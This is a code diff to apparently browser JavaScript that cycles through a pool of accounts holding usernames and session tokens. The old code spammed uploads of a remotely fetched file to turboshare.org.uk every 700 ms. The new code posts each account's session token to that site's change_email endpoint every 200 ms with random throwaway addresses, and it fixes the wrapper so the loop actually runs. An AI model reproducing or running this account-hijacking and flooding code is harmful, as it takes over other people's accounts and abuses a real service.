@@ -63,7 +63,7 @@
             } catch (e) {
               continue;
             }
-            if (res?.status !== 503) return res;
+            if (res?.status !== 502&&res?.status !== 503) return res;
             if (i > 7) throw new Error("Failed to fetch");
             await sleep(500);
           }
@@ -309,25 +309,26 @@
 		}
 		if (accPool.length > 0) {
 		  !async function(){
-		    const ssibu = await fetch("https://raw.githubusercontent.com/anuser88/cebu--/master/shit.sibu").then(x=>x.blob());
+		    //const ssibu = await fetch("https://raw.githubusercontent.com/anuser88/cebu--/master/shit.sibu").then(x=>x.blob());
 		    setInterval(()=>{
-			  const sAcc = poolGet();
-			  const sibuForm = new FormData();
-		      sibuForm.append("file", ssibu, `part_0.sb3`);
-		      sibuForm.append("username", sAcc.username);
-		      sibuForm.append("sessionToken", sAcc.sessionToken);
-			  fetch("https://turboshare.org.uk/api/upload",{
+			  let sAcc = poolGet();
+			  sAcc.newEmail = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}@lmfao.com`;
+			  //const sibuForm = new FormData();
+		      //sibuForm.append("file", ssibu, `part_0.sb3`);
+		      //sibuForm.append("username", sAcc.username);
+		      //sibuForm.append("sessionToken", sAcc.sessionToken);
+			  fetch("https://turboshare.org.uk/api/auth/change_email",{
 		        "headers": {
 			      "x-client-type": "StudioDANV-Web"
 		        },
 		        "referrer": "https://turboshare.org.uk/",
-		        "body": sibuForm,
+		        "body": JSON.stringify(sAcc),
 		        "method": "POST",
 		        "mode": "cors",
 		        "credentials": "include"
               })
-			},700);
-		  };
+			},200);
+		  }();
 		  document.getElementById('upl-btn').classList.add('nav-active');
 		  document.getElementById('upl-btn').disabled = false;
 		  document.getElementById('upload-file').disabled = false;
